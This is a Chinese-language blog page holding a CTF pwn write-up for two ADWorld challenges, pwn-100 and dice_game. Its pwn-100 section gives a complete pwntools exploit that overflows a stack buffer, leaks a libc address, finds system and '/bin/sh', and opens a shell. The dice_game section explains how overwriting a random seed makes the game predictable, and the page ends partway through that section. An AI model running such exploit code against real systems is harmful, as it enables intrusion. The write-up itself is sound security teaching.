@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>ADWorld-PWN  (updating..) | Ld1ng</title>
+  <meta name="description" content="前言话说前几天18级re选手被张老师公开批斗… 嗯…从今天起每天一道题尽量抽出时间多做做题。 那么好，就从pwn的高手进阶区开始！  0x01 pwn-100checksec一下查看保护  拖入IDA 跟进主函数 程序很简单 1234567int sub_40068E()&amp;#123;  char v1; &#x2F;&#x2F; [rsp+0h] [rbp-40h]  sub_40063D((__int64)&amp;amp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ADWorld-PWN  (updating..)">
+<meta property="og:url" content="http://ld1ng.com/2020/06/02/ADWorld-pwn/index.html">
+<meta property="og:site_name" content="Ld1ng">
+<meta property="og:description" content="前言话说前几天18级re选手被张老师公开批斗… 嗯…从今天起每天一道题尽量抽出时间多做做题。 那么好，就从pwn的高手进阶区开始！  0x01 pwn-100checksec一下查看保护  拖入IDA 跟进主函数 程序很简单 1234567int sub_40068E()&amp;#123;  char v1; &#x2F;&#x2F; [rsp+0h] [rbp-40h]  sub_40063D((__int64)&amp;amp">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/06/02/tgAR9TQ2uZlKGI8.png">
+<meta property="og:image" content="https://i.loli.net/2020/06/02/sU7lnAqMPF9HXSb.png">
+<meta property="og:image" content="https://i.loli.net/2020/06/02/AuIqndLSoywrBlG.png">
+<meta property="og:image" content="https://i.loli.net/2020/06/01/CBmDiJf89XK1wFq.png">
+<meta property="og:image" content="https://i.loli.net/2020/06/01/gr5XB6uqc8lIOYs.png">
+<meta property="article:published_time" content="2020-06-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-06-02T13:32:44.674Z">
+<meta property="article:author" content="Ld1ng">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/06/02/tgAR9TQ2uZlKGI8.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://ld1ng.com/2020/06/02/ADWorld-pwn/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Ld1ng" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/images/favicon.ico" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+    <link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet">
+  
+  
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/ld1ng" target="_blank">
+          <img class="img-circle img-rotate" src="/images/liding.png" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">Ld1ng</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Student</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> JiangSu , China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav menu-highlight">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">Repository</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">Books</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/ld1ng" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://weibo.com/5580147545/profile?" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/Liding10763325" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>When people lose their thinking power, the human age will end</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/DEVELOPMENT/">DEVELOPMENT</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PERSONAL/">PERSONAL</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/REVERSE/">REVERSE</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/OpenCV/" rel="tag">OpenCV</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Test/" rel="tag">Test</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/CTF/" style="font-size: 14px;">CTF</a> <a href="/tags/OpenCV/" style="font-size: 13px;">OpenCV</a> <a href="/tags/Test/" style="font-size: 13px;">Test</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">4</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/PWN/">PWN</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/06/02/ADWorld-pwn/" class="title">ADWorld-PWN  (updating..)</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-06-01T16:00:00.000Z" itemprop="datePublished">2020-06-02</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/PWN/">PWN</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/05/25/bugku-pwn5/" class="title">BugkuCTF pwn5</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-05-24T16:00:00.000Z" itemprop="datePublished">2020-05-25</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/REVERSE/">REVERSE</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/05/11/IDA%E5%8A%A8%E8%B0%83/" class="title">CUMT CTF Mind reading</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-05-10T16:00:00.000Z" itemprop="datePublished">2020-05-11</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/DEVELOPMENT/">DEVELOPMENT</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/05/08/OpenCV/" class="title">基于OpenCV的动态识别系统——随笔</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-05-07T16:00:00.000Z" itemprop="datePublished">2020-05-08</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/PERSONAL/">PERSONAL</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/05/05/hello-world/" class="title">hello, world</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-05-04T16:00:00.000Z" itemprop="datePublished">2020-05-05</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <nav id="toc" class="article-toc">
+      <h3 class="toc-title">Catalogue</h3>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-pwn-100"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 pwn-100</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.1.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-dice-game"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 dice_game</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol>
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-ADWorld-pwn" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ADWorld-PWN  (updating..)
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2020/06/02/ADWorld-pwn/" class="article-date">
+	  <time datetime="2020-06-01T16:00:00.000Z" itemprop="datePublished">2020-06-02</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/PWN/">PWN</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
+  </span>
+
+
+        
+	<span class="article-read hidden-xs">
+	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
+	    <span id="busuanzi_container_page_pv">
+			<span id="busuanzi_value_page_pv">0</span>
+		</span>
+	</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/06/02/ADWorld-pwn/#comments" class="article-comment-link">Comments</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 1.4k(words)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 6(minutes)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>话说前几天18级re选手被张老师公开批斗…</p>
+<p>嗯…从今天起<del>每天一道题</del>尽量抽出时间多做做题。</p>
+<p>那么好，就从pwn的<del>高手</del>进阶区开始！</p>
+<hr>
+<h2 id="0x01-pwn-100"><a href="#0x01-pwn-100" class="headerlink" title="0x01 pwn-100"></a>0x01 pwn-100</h2><p>checksec一下查看保护</p>
+<p><img src="https://i.loli.net/2020/06/02/tgAR9TQ2uZlKGI8.png" alt="image-20200602195417079"></p>
+<p>拖入IDA</p>
+<p>跟进主函数</p>
+<p>程序很简单</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_40068E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  sub_40063D((__int64)&amp;v1, <span class="number">200</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"bye~"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进关键函数<code>sub_40063D((__int64)&amp;v1, 200)</code>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_40063D</span><span class="params">(__int64 a1, <span class="keyword">signed</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)((<span class="keyword">signed</span> <span class="keyword">int</span>)i + a1), <span class="number">1u</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>函数逻辑很简单，连续输入200次，然后bye~</p>
+<p>不同于新手区，现在的题里面已经没有现成的 system ，也没有/bin/sh 字符串，也没有提供 </p>
+<p>libc.so 给我们，那么我们要做的就是想办法泄露 libc 地址，拿到 system 函数和/bin/sh 字符</p>
+<p>串，这题呢，我们可以利用 put 来泄露 read 函数的地址，然后再利用 LibcSearcher 查询可能的 libc。</p>
+<p>v1只有0x40，而<code>read</code>指定输入大小200，因此利用栈溢出漏洞即可。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./100'</span>)</span><br><span class="line"><span class="comment">#x86都是靠栈来传递参数的而x64换了它顺序是rdi, rsi, rdx, rcx, r8, r9,如果多于6个参数才会用栈</span></span><br><span class="line">readgot = elf.got[<span class="string">'read'</span>]</span><br><span class="line">putaddr = elf.sym[<span class="string">'puts'</span>]</span><br><span class="line">mainaddr = <span class="number">0x4006B8</span></span><br><span class="line"><span class="comment">#pop rdi 的地址</span></span><br><span class="line">poprdi = <span class="number">0x400763</span> </span><br><span class="line"><span class="comment">#ROPgadget --binary 100 --only 'pop|ret'</span></span><br><span class="line">sh = process(<span class="string">'./100'</span>)</span><br><span class="line"><span class="comment">#sh = remote('124.126.19.106',59722)</span></span><br><span class="line"><span class="comment">#这个payload用于泄露 read 位于 libc 的地址</span></span><br><span class="line"><span class="comment">#pop edi将 read 的地址加载到 edi 中，用于传给 put 输出显示</span></span><br><span class="line"><span class="comment">#mainaddr 为覆盖 eip，这样我们又可以重新执行 main 函数了</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x48</span> + p64(poprdi) + p64(readgot) + p64(putaddr) + p64(mainaddr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">'A'</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'bye~\n'</span>)</span><br><span class="line"><span class="comment">#注意，这步重要,必须要去掉末尾的\n 符号,凑够8位</span></span><br><span class="line">s = sh.recv().split(<span class="string">'\n'</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line"><span class="comment">#得到 read 的地址</span></span><br><span class="line">addr = u64(s)</span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line"><span class="comment">#libc 数据库查询</span></span><br><span class="line">obj = LibcSearcher(<span class="string">"read"</span>,addr)</span><br><span class="line"><span class="comment">#得到 libc 加载地址</span></span><br><span class="line">libc_base = addr - obj.dump(<span class="string">'read'</span>)</span><br><span class="line"><span class="comment">#获得 system 地址</span></span><br><span class="line">system_addr = obj.dump(<span class="string">"system"</span>) + libc_base</span><br><span class="line"><span class="comment">#获得/bin/sh 地址</span></span><br><span class="line">binsh_addr = obj.dump(<span class="string">"str_bin_sh"</span>) + libc_base</span><br><span class="line"><span class="keyword">print</span> hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> hex(binsh_addr)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x48</span> + p64(poprdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">'B'</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>附上大佬的<a href="http://www.luyixian.cn/news_show_331108.aspx" target="_blank" rel="noopener">关于64位程序libc泄露的问题讲解</a>，好好学，好好看     ε=ε=ε=(<del>￣▽￣)</del></p>
+<hr>
+<h2 id="0x02-dice-game"><a href="#0x02-dice-game" class="headerlink" title="0x02 dice_game"></a>0x02 dice_game</h2><p>走下形式，checksec</p>
+<p><img src="https://i.loli.net/2020/06/02/sU7lnAqMPF9HXSb.png" alt="image-20200602204919921"></p>
+<p>No canary ，难道又有心爱的栈溢出？</p>
+<p>接着看</p>
+<p>拖入IDA，F5，分析程序</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">55</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+37h] [rbp-19h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+4Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  *(_QWORD *)seed = time(<span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome, let me know your name: "</span>, a2);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v6 = <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v6 &lt;= <span class="number">49</span> )</span><br><span class="line">    buf[v6 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hi, %s. Let's play a game.\n"</span>, buf);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  v8 = <span class="number">1</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Game %d/50\n"</span>, v8);</span><br><span class="line">    v5 = sub_A20();</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">50</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_B28((__int64)buf);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Bye bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到<code>srand(seed)</code>，套路应该清楚了，继续跟进<code>sub_A20()</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">sub_A20</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int16 v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  __int16 v2; <span class="comment">// [rsp+Eh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me the point(1~6): "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%hd"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= <span class="number">0</span> || v1 &gt; <span class="number">6</span> || v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="number">6</span> )</span><br><span class="line">      _assert_fail(<span class="string">"(point&gt;=1 &amp;&amp; point&lt;=6) &amp;&amp; (sPoint&gt;=1 &amp;&amp; sPoint&lt;=6)"</span>, <span class="string">"dice_game.c"</span>, <span class="number">0x18</span>u, <span class="string">"dice_game"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 == v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You win."</span>);</span><br><span class="line">      result = <span class="number">1L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You lost."</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid value!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>大体思路是，连续输入50次，程序会产生50个随机数，如果50次都猜中，那么You, win.</p>
+<p>那么如果能控制seed为一个固定值，我们就可以知道它的固定序列，即可以在输入name的时</p>
+<p>候，让输入的数据覆盖srand函数内部的随机数种子，就可以控制随机数的生成。</p>
+<p>观察一下栈情况</p>
+<img src="https://i.loli.net/2020/06/02/AuIqndLSoywrBlG.png" alt="image-20200602205555989" style="zoom: 67%;" />
+
+<p>随机数种子的地址和输入名字的buf的地址之间相差0x40，在加上4个字节覆盖srand的随机数种子，妙啊<del>~</del></p>
